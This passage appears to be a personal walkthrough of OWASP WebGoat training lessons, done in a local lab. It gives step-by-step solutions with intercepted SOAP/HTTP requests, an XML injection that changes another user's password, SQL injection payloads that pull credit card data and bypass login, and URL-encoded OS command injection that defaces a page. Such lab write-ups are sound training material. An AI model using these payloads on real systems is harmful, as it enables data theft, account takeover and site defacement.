+Cookie: JSESSIONID=C3C53BCF0F5F3EE816AD98AA970EA6D4; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic cm9vdDpvd2FzcGJ3YQ==
+Connection: close
+Content-Type: text/xml 
+Content-Length: 466
+SOAPAction:
+
+<?xml version="1.0" encoding="UTF-8"?> 
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" 
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <SOAP-ENV:Body> 
+    <ns1:getLastName SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="http://lessons"> 
+    <id xsi:type="xsd:int">101</id> 
+    </ns1:getLastName>
+  </SOAP-ENV:Body> 
+</SOAP-ENV:Envelope>
+
+Forward
+
+
+WSDL Scanning
+
+Challenge:
+This screen is the API for a web service. Check the WSDL file for this web service and try to get some customer credit numbers. 
+
+Solution:
+Open 'WebGoat WSDL File' in a new tab
+Open Burp Proxy with Intercept On
+Select First name
+Submit
+field=getCreditCard
+Forward
+
+
+Web Service SAX Injection
+
+Challenge:
+Some web interfaces make use of Web Services in the background. If the frontend relies on the web service for all input validation, it may be possible to corrupt the XML that the web interface sends.
+
+In this exercise, try to change the password for a user other than 101. 
+
+Solution:
+Open Burp Proxy with Intercept On
+Go!
+yes</password><id xsi:type='xsd:int'>102</id><password xsi:type='xsd:string'>12345
+
+
+Web Service SQL Injection
+
+Challenge:
+Check the web service description language (WSDL) file and try to obtain multiple customer credit card numbers. You will not see the results returned to this screen. When you believe you have suceeded, refresh the page and look for the 'green star'. 
+
+Solution:
+Open 'WebGoat WSDL File' in a new tab
+Open Burp Proxy with Intercept On
+Browse to: 192.168.189.146/WebGoat/services/WsSqlInjection
+
+POST /WebGoat/services/WsSqlInjection HTTP/1.1
+Host: 192.168.189.146
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://192.168.189.146/WebGoat/attack?Screen=19&menu=1900
+Cookie: JSESSIONID=C3C53BCF0F5F3EE816AD98AA970EA6D4; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic cm9vdDpvd2FzcGJ3YQ==
+Connection: close
+Content-Type: text/xml 
+Content-Length: 406
+SOAPAction:
+
+<?xml version="1.0" encoding="UTF-8"?> 
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" 
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <SOAP-ENV:Body> 
+    <ns1:getCreditCard SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="http://lessons"> 
+    <id xsi:type="xsd:string">101 or 1=1</id> 
+    </ns1:getCreditCard>
+  </SOAP-ENV:Body> 
+</SOAP-ENV:Envelope>
+
+Forward
+Refresh
+
+
+(XVIII) Challenge
+
+The CHALLENGE!
+Your mission is to break the authentication scheme, steal all the credit cards from the database, and then deface the website. You will have to use many of the techniques you have learned in the other lessons. The main webpage to deface for this site is 'webgoat_challenge_root.jsp'
+
+Solution:
+Right-click -> View Page Source
+# Notice the <input name='user' type='HIDDEN' value='youaretheweakestlink'>
+Browse to: http://192.168.189.146/WebGoat/source?source=true
+Ctrl-F -> youaretheweakestlink
+# The pass is 'goodbye'
+User: youaretheweakestlink
+Pass: goodbye
+Open Burp Suite
+In Burp Decoder: youaretheweakestlink' or '1'='1 -> Encode As -> Base64
+Copy the output: eW91YXJldGhld2Vha2VzdGxpbmsnIG9yICcxJz0nMQ==
+Buy Now!
+user="eW91YXJldGhld2Vha2VzdGxpbmsnIG9yICcxJz0nMQ=="
+Forward
+Select 'ip' -> View Network
+Browse to: http://yehg.net/encoding/
+Paste:
+ip && pwd && ls && find -name webgoat_challenge_root.jsp
+encodeURIComponent
+
+File=ip%20%26%26%20pwd%20%26%26%20ls%20%26%26%20find%20-name%20webgoat_challenge_root.jsp
+Forward
+
+Browse to: http://yehg.net/encoding/
+Paste:
+ip && echo "<html><body>Cookies are good</body></html>" > webgoat_challenge_root.jsp
+encodeURIComponent
+
+File=ip%20%26%26%20echo%20%22%3Chtml%3E%3Cbody%3ECookies%20are%20good%3C%2Fbody%3E%3C%2Fhtml%3E%22%20%3E%20webgoat_challenge_root.jsp
+Forward
+
+
+Finished: 12/14/2016
+
